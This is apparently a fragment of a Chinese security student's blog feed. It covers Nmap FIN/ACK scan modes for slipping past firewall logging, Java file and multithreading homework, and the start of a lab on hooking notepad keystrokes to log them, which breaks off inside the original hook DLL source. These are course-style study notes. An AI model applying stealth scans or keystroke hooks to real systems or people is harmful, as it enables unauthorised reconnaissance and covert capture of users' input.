title="-sF"></a>-sF</h4><p>有些时候防火墙绘过滤tcp syn数据包，有些时候会记录syn数据包并检测时候有nmap扫描。这时候可以使用TCP FIN scanning。这种方式很简单。发送tcp FIN数据包到待测端口。如果返回RST数据包，则说明该端口关闭，如果无返回则说明该端口开放。这时tcp协议的一个BUG，所以这种扫描方式不一定百分之百可靠（例如windows），但是这种扫描方式适合大部分 *NIX 系统。</p><p><img src="https://s2.ax1x.com/2019/11/16/MBdqiR.png" alt="img"></p><h4 id="sA"><a href="#sA" class="headerlink" title="-sA"></a>-sA</h4><p>一个简单的ACK扫描意味着攻击者只有较低几率检测到受害机，但是有较高几率发现防火墙<br>防火墙的四种响应:</p><p>open port（防火墙允许少数端口打开）<br>closed port（由于防火墙的缘故，大部分的端口都被关闭）<br>filtered（nmap不能确定端口是否打开或者关闭）<br>unfiletered（nmap能够访问这个端口，但是不清楚这个端口打开的状态）</p><h4 id="Pn"><a href="#Pn" class="headerlink" title="-Pn"></a>-Pn</h4><p>当确保主机存活的时候可以使用pn进行深入扫描</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Nmap扫描模式探究&quot;&gt;&lt;a href=&quot;#Nmap扫描模式探究&quot; class=&quot;headerlink&quot; title=&quot;Nmap扫描模式探究&quot;&gt;&lt;/a&gt;Nmap扫描模式探究&lt;/h2&gt;&lt;p&gt;一直只会Nmap最基本的扫描，对于Nmap的很多扫描模式没有深入探究，这次尝试学习一下。（重点是我挖不出来洞了，tcl&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Nmap学习" scheme="/tags/Nmap%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Java-文件操作与多线程编程基础</title>
    <link href="/2019/11/12/Java-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    <id>/2019/11/12/Java-文件操作与多线程编程基础/</id>
    <published>2019-11-12T14:02:26.000Z</published>
    <updated>2019-11-16T14:43:57.551Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java-文件操作与多线程编程基础"><a href="#Java-文件操作与多线程编程基础" class="headerlink" title="Java 文件操作与多线程编程基础"></a>Java 文件操作与多线程编程基础</h2><h3 id="文件操作部分题目"><a href="#文件操作部分题目" class="headerlink" title="文件操作部分题目"></a>文件操作部分题目</h3><blockquote><p>1.实现一个程序，该程序的输人是一个目录字符串和一个文件扩展名字符串，程序递归地搜索该目录及其各级子目录，在这些目录中查找所有扩展名与指定扩展名相同的文件，将这些文件的相对路径名记录下来并向控制台输出。<br>2.实现两个程序，第一个程序读入一个文件plain.txt将读入的每个字节的数值加5,然后输出到另一个文件cipher.ixt中，第二个程序从cipher.txt中读取每个字节，将每个字节的数值减5.再输出到文件decrypt.txt中。比较plain.txt与decrypt.txt的内容。</p></blockquote><a id="more"></a><h3 id="多线程操作部分题目"><a href="#多线程操作部分题目" class="headerlink" title="多线程操作部分题目"></a>多线程操作部分题目</h3><blockquote><p>1.在很多系统中，需要日志管理功能，该功能通常可由一个类实现，在系统生命周期中，日志管理类仅存在一一个对象实例，实现将各个功能线程的日志写入日志文件的功能。<br>要求:<br>(1)实现日志管理类Loger, 实现向唯一的日志文件写人日志的功能，并使用Singeleton设计模式实现在系统生命周期中仅存在该类的唯一对象实例。<br>(2)实现多个功能线程，各个线程排他性地使用日志管理对象的日志写入功能，每隔一段随机的时间就执行写入日志动作。 系统终止时观察被写入的日志文件。</p></blockquote><hr><h3 id="文件操作部分题目代码"><a href="#文件操作部分题目代码" class="headerlink" title="文件操作部分题目代码"></a>文件操作部分题目代码</h3><h4 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.<span class="keyword">File</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> homework8_2&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> filedata(<span class="keyword">File</span> f,String s,<span class="keyword">int</span> len)&#123;</span><br><span class="line"><span class="keyword">if</span>(f.isFile())<span class="comment">//判断是否是目录</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.<span class="keyword">println</span>(f+<span class="string">"is a file"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">File</span>[] files=f.listFiles();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">File</span> <span class="keyword">file</span>:files)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">file</span>.isFile())&#123;</span><br><span class="line">String fileName = <span class="keyword">file</span>.getName();</span><br><span class="line">        String suffix = fileName.substring(fileName.lastIndexOf(<span class="string">"."</span>) + <span class="number">1</span>);<span class="comment">//截取文件后缀</span></span><br><span class="line">        <span class="keyword">if</span>(suffix.equals(s))&#123;</span><br><span class="line">        System.out.<span class="keyword">println</span>(fileName +  <span class="string">"   :   .\\"</span> +<span class="keyword">file</span>.getPath().substring(len+<span class="number">1</span>));<span class="comment">//获取相对路径</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">filedata(<span class="keyword">file</span>,s,len);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</span><br><span class="line"><span class="keyword">File</span> <span class="keyword">file</span> = <span class="keyword">new</span> <span class="keyword">File</span>(args[<span class="number">0</span>]);<span class="comment">//此处需要输入第一个命令行参数，需要输入需要查找的目录</span></span><br><span class="line">String s = args[<span class="number">1</span>];<span class="comment">//此处需要输入第一个命令行参数，需要输入想要查找的文件后缀</span></span><br><span class="line"><span class="keyword">int</span> len = <span class="keyword">file</span>.getPath().length();</span><br><span class="line">filedata(<span class="keyword">file</span>,s,len);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试文件的目录树为：</span><br><span class="line">C:.</span><br><span class="line">└─test1</span><br><span class="line">    └─test2</span><br><span class="line">代码运行结果为：</span><br><span class="line"><span class="number">1</span><span class="selector-class">.txt</span>   :   .\<span class="number">1</span>.txt</span><br><span class="line"><span class="number">2</span><span class="selector-class">.txt</span>   :   .\test1\<span class="number">2</span>.txt</span><br><span class="line"><span class="number">3</span><span class="selector-class">.txt</span>   :   .\test1\test2\<span class="number">3</span>.txt</span><br></pre></td></tr></table></figure></p><h4 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h4><p>程序一<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> class homework8_7_1&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> filedata(FileInputStream plain) throws IOException&#123;</span><br><span class="line">FileOutputStream cipher0 = <span class="keyword">new</span> FileOutputStream(<span class="string">"cipher.txt"</span>);</span><br><span class="line"><span class="keyword">int</span> c;</span><br><span class="line"><span class="built_in">while</span>((c = plain.<span class="built_in">read</span>()) != <span class="number">-1</span>)&#123;</span><br><span class="line">cipher0.<span class="built_in">write</span>(c+<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line">cipher0.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) throws IOException&#123;</span><br><span class="line">FileInputStream plain = <span class="keyword">new</span> FileInputStream(args[<span class="number">0</span>]);<span class="comment">//程序需要输入一个命令行参数，代表储存明文文件的绝对路径或者相对路径</span></span><br><span class="line">filedata(plain);</span><br><span class="line">System.out.<span class="built_in">println</span>(<span class="string">"Success! "</span>);</span><br><span class="line">plain.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序二<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> class homework8_7_2&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> filedata(FileInputStream plain) throws IOException&#123;</span><br><span class="line">FileInputStream  cipher1 = <span class="keyword">new</span> FileInputStream(<span class="string">"cipher.txt"</span>);</span><br><span class="line">FileOutputStream decrypt = <span class="keyword">new</span> FileOutputStream(<span class="string">"decrypt.txt"</span>);</span><br><span class="line"><span class="keyword">int</span> c;</span><br><span class="line"><span class="keyword">String</span> str0 = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">String</span> str1 = <span class="string">""</span>;</span><br><span class="line"><span class="built_in">while</span>((c = plain.<span class="built_in">read</span>()) != <span class="number">-1</span>)&#123;</span><br><span class="line">str0 += c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">while</span>((c = cipher1.<span class="built_in">read</span>()) != <span class="number">-1</span>)&#123;</span><br><span class="line">decrypt.<span class="built_in">write</span>(c<span class="number">-5</span>);</span><br><span class="line">str1 += (c<span class="number">-5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">if</span> (str0.equals(str1))<span class="comment">//把两文件内容读入一个字符串，使用字符串比较来实现，遇到大文件可能速率较慢，可以采用md5</span></span><br><span class="line">System.out.<span class="built_in">println</span>(<span class="string">"plain.txt is equal to decrypt.txt"</span>);</span><br><span class="line">cipher1.<span class="built_in">close</span>();</span><br><span class="line">decrypt.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) throws IOException&#123;</span><br><span class="line">FileInputStream plain = <span class="keyword">new</span> FileInputStream(args[<span class="number">0</span>]);<span class="comment">//程序需要输入一个命令行参数，代表储存明文文件的绝对路径或者相对路径</span></span><br><span class="line">filedata(plain);</span><br><span class="line">System.out.<span class="built_in">println</span>(<span class="string">"Success! "</span>);</span><br><span class="line">plain.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">程序一运行结果：</span><br><span class="line">Success!</span><br><span class="line">程序二运行结果：</span><br><span class="line">plain<span class="selector-class">.txt</span> is equal to decrypt.txt</span><br><span class="line">Success!</span><br></pre></td></tr></table></figure></p><hr><h3 id="多线程编程部分"><a href="#多线程编程部分" class="headerlink" title="多线程编程部分"></a>多线程编程部分</h3><h4 id="题目一-1"><a href="#题目一-1" class="headerlink" title="题目一"></a>题目一</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> homework10_6&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> Logger log;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> Random rand;</span><br><span class="line"><span class="keyword">static</span> String <span class="keyword">file</span>;</span><br><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line">log = <span class="keyword">new</span> Logger();</span><br><span class="line">rand = <span class="keyword">new</span> Random(System.currentTimeMillis());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</span><br><span class="line"><span class="keyword">file</span> = args[<span class="number">0</span>];<span class="comment">//此处需要一个命令行参数，代表那个日志的绝对路径或者相对路径</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)<span class="comment">//启动十个线程</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> thread()).start();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> Logger &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> writeinformation(<span class="keyword">int</span> a,String s) <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">FileOutputStream <span class="keyword">file</span> = <span class="keyword">new</span> FileOutputStream(homework10_6.<span class="keyword">file</span>,<span class="keyword">true</span>);<span class="comment">//启用追加模式</span></span><br><span class="line">String e = System.currentTimeMillis()+<span class="string">" by thread "</span>+ s +<span class="string">" and this thread delayed "</span> + thread.intArray[a] + <span class="string">" s\n"</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; e.length();i++)<span class="comment">//遍历字符写入</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> c = (<span class="keyword">int</span>)e.charAt(i);</span><br><span class="line"><span class="keyword">file</span>.<span class="keyword">write</span>(c);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">file</span>.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> thread <span class="keyword">implements</span> Runnable&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> idcnt = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> threadid = idcnt++;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span>[] intArray = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];<span class="comment">//保存每个线程时延时间</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> run()&#123;</span><br><span class="line">System.out.<span class="keyword">println</span>(<span class="string">"Thread "</span>+ threadid +<span class="string">" create successfully"</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">int</span> time = homework10_6.rand.nextInt(<span class="number">3</span>);<span class="comment">//生成[0,3)的随机数</span></span><br><span class="line">intArray[threadid-<span class="number">1</span>] = time;</span><br><span class="line">Thread.sleep(time*<span class="number">1000</span>);<span class="comment">//sleep</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">synchronized</span>(homework10_6.log)<span class="comment">//给日志对象加对象锁</span></span><br><span class="line">&#123;</span><br><span class="line">String p = threadid+<span class="string">""</span>;</span><br><span class="line"><span class="keyword">int</span> i = threadid-<span class="number">1</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">homework10_6.log.writeinformation(i,p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (IOException e)&#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Thread 1 <span class="keyword">create</span> successfully</span><br><span class="line"><span class="keyword">Thread</span> <span class="number">6</span> <span class="keyword">create</span> successfully</span><br><span class="line"><span class="keyword">Thread</span> <span class="number">5</span> <span class="keyword">create</span> successfully</span><br><span class="line"><span class="keyword">Thread</span> <span class="number">2</span> <span class="keyword">create</span> successfully</span><br><span class="line"><span class="keyword">Thread</span> <span class="number">4</span> <span class="keyword">create</span> successfully</span><br><span class="line"><span class="keyword">Thread</span> <span class="number">3</span> <span class="keyword">create</span> successfully</span><br><span class="line"><span class="keyword">Thread</span> <span class="number">10</span> <span class="keyword">create</span> successfully</span><br><span class="line"><span class="keyword">Thread</span> <span class="number">7</span> <span class="keyword">create</span> successfully</span><br><span class="line"><span class="keyword">Thread</span> <span class="number">8</span> <span class="keyword">create</span> successfully</span><br><span class="line"><span class="keyword">Thread</span> <span class="number">9</span> <span class="keyword">create</span> successfully</span><br><span class="line">日志文件里为：</span><br><span class="line"><span class="number">1573572136785</span> <span class="keyword">by</span> <span class="keyword">thread</span> <span class="number">1</span> <span class="keyword">and</span> this <span class="keyword">thread</span> <span class="keyword">delayed</span> <span class="number">0</span> s</span><br><span class="line"><span class="number">1573572136796</span> <span class="keyword">by</span> <span class="keyword">thread</span> <span class="number">10</span> <span class="keyword">and</span> this <span class="keyword">thread</span> <span class="keyword">delayed</span> <span class="number">0</span> s</span><br><span class="line"><span class="number">1573572136797</span> <span class="keyword">by</span> <span class="keyword">thread</span> <span class="number">7</span> <span class="keyword">and</span> this <span class="keyword">thread</span> <span class="keyword">delayed</span> <span class="number">0</span> s</span><br><span class="line"><span class="number">1573572136803</span> <span class="keyword">by</span> <span class="keyword">thread</span> <span class="number">9</span> <span class="keyword">and</span> this <span class="keyword">thread</span> <span class="keyword">delayed</span> <span class="number">0</span> s</span><br><span class="line"><span class="number">1573572137790</span> <span class="keyword">by</span> <span class="keyword">thread</span> <span class="number">2</span> <span class="keyword">and</span> this <span class="keyword">thread</span> <span class="keyword">delayed</span> <span class="number">1</span> s</span><br><span class="line"><span class="number">1573572137794</span> <span class="keyword">by</span> <span class="keyword">thread</span> <span class="number">3</span> <span class="keyword">and</span> this <span class="keyword">thread</span> <span class="keyword">delayed</span> <span class="number">1</span> s</span><br><span class="line"><span class="number">1573572137798</span> <span class="keyword">by</span> <span class="keyword">thread</span> <span class="number">8</span> <span class="keyword">and</span> this <span class="keyword">thread</span> <span class="keyword">delayed</span> <span class="number">1</span> s</span><br><span class="line"><span class="number">1573572138789</span> <span class="keyword">by</span> <span class="keyword">thread</span> <span class="number">5</span> <span class="keyword">and</span> this <span class="keyword">thread</span> <span class="keyword">delayed</span> <span class="number">2</span> s</span><br><span class="line"><span class="number">1573572138791</span> <span class="keyword">by</span> <span class="keyword">thread</span> <span class="number">6</span> <span class="keyword">and</span> this <span class="keyword">thread</span> <span class="keyword">delayed</span> <span class="number">2</span> s</span><br><span class="line"><span class="number">1573572138792</span> <span class="keyword">by</span> <span class="keyword">thread</span> <span class="number">4</span> <span class="keyword">and</span> this <span class="keyword">thread</span> <span class="keyword">delayed</span> <span class="number">2</span> s</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Java-文件操作与多线程编程基础&quot;&gt;&lt;a href=&quot;#Java-文件操作与多线程编程基础&quot; class=&quot;headerlink&quot; title=&quot;Java 文件操作与多线程编程基础&quot;&gt;&lt;/a&gt;Java 文件操作与多线程编程基础&lt;/h2&gt;&lt;h3 id=&quot;文件操作部分题目&quot;&gt;&lt;a href=&quot;#文件操作部分题目&quot; class=&quot;headerlink&quot; title=&quot;文件操作部分题目&quot;&gt;&lt;/a&gt;文件操作部分题目&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;1.实现一个程序，该程序的输人是一个目录字符串和一个文件扩展名字符串，程序递归地搜索该目录及其各级子目录，在这些目录中查找所有扩展名与指定扩展名相同的文件，将这些文件的相对路径名记录下来并向控制台输出。&lt;br&gt;2.实现两个程序，第一个程序读入一个文件plain.txt将读入的每个字节的数值加5,然后输出到另一个文件cipher.ixt中，第二个程序从cipher.txt中读取每个字节，将每个字节的数值减5.再输出到文件decrypt.txt中。比较plain.txt与decrypt.txt的内容。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="开发相关" scheme="/categories/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="Java学习" scheme="/tags/Java%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="文件操作" scheme="/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    
      <category term="多线程编程基础" scheme="/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>键盘消息钩取学习</title>
    <link href="/2019/11/12/%E9%94%AE%E7%9B%98%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96%E5%AD%A6%E4%B9%A0/"/>
    <id>/2019/11/12/键盘消息钩取学习/</id>
    <published>2019-11-12T02:49:12.000Z</published>
    <updated>2019-11-12T03:38:50.104Z</updated>
    
    <content type="html"><![CDATA[<h2 id="键盘消息钩取学习"><a href="#键盘消息钩取学习" class="headerlink" title="键盘消息钩取学习"></a>键盘消息钩取学习</h2><blockquote><p>题目：修改 HookDll.cpp，钩取对 notepad 的输入，使得：<br>a) 输入文本仍能正常显示<br>b) 所有输入文本能够记录到 input.txt 文件中 </p></blockquote><a id="more"></a><hr><h3 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h3><blockquote><p>两份代码均为vs2019 Debug x64模式编译</p></blockquote><hr><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><blockquote><p>即首先修改HookDll.cpp，生成一个Dll文件，在编写一个cpp文件，从生成的dll导入HookStart和HookStop两个函数，实现键盘钩子</p></blockquote><hr><h3 id="题目注意事项"><a href="#题目注意事项" class="headerlink" title="题目注意事项"></a>题目注意事项</h3><blockquote><p>因为notepad是64位，32位的钩子无法钩取64位notepad的消息，所以dll和另一个cpp文件都需要是64位，如果出现32位的cpp文件和64位dll文件等混用情况，会报出内存冲突错误<br>dll名字要写对，否则会读取失败，注意大小写<br>因为读取的是虚拟按键，所以字母统一钩取的为大写字母<br>小键盘和数字键盘虚拟按键不一样，小键盘读取的是小写字母</p></blockquote><hr><h3 id="未修改版HookDll-cpp源码"><a href="#未修改版HookDll-cpp源码" class="headerlink" title="未修改版HookDll.cpp源码"></a>未修改版HookDll.cpp源码</h3><blockquote><p>HookDll.cpp源代码<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span></span>&#123;</span><br><span class="line"><span class="keyword">switch</span>( dwReason )&#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span>&#123;</span><br><span class="line">TCHAR szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">TCHAR *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( nCode &gt;= <span class="number">0</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span>( !(lParam &amp; <span class="number">0x80000000</span>) )&#123; <span class="comment">//lParam的第31位（0：按键；1：释放键）</span></span><br><span class="line">GetModuleFileName(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">p = _tcsrchr(szPath, _T(<span class="string">'\\'</span>));</span><br><span class="line">            <span class="comment">//若装载当前DLL的进程为notepad.exe，则消息不会传递给下一个钩子</span></span><br><span class="line"><span class="keyword">if</span>( !lstrcmpi(p + <span class="number">1</span>, _T(<span class="string">"notepad.exe"</span>)) )</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 当前进程不是notepad.exe，将消息传递给下一个钩子</span></span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span 